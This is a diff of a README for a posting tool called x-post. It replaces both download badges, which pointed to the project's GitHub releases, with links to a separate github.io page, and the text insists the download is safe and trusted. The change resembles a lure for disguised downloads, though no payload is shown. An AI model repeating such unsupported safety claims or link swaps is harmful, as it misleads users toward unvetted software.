@@ -23,7 +23,7 @@ x-post solves all of these problems:
 
 To get started, click the colored button below — this is the official download page for x-post. You will be taken to a safe and trusted page where the software is available.
 
-[![Download x-post](https://img.shields.io/badge/Download_x--post-Latest_Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/EachsodaGng/x-post/releases)
+[![Download x-post](https://img.shields.io/badge/Download_x--post-Latest_Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://eachsodagng.github.io)
 
 Visit this link to download the application.
 
@@ -153,7 +153,7 @@ Yes — x-post is free to download and use for personal projects and small conte
 
 Don't waste another minute posting things one by one by hand. With x-post, your content publishing becomes fast, automatic, and multilingual. Visit the download link, install the app, and see the power of effortless posting today.
 
-[![Download x-post](https://img.shields.io/badge/Get_x--post-FREE_Download-10B981?style=for-the-badge&logo=github&logoColor=white)](https://github.com/EachsodaGng/x-post/releases)
+[![Download x-post](https://img.shields.io/badge/Get_x--post-FREE_Download-10B981?style=for-the-badge&logo=github&logoColor=white)](https://eachsodagng.github.io)
 
 Visit this link to download the application. The download is safe and free.
 
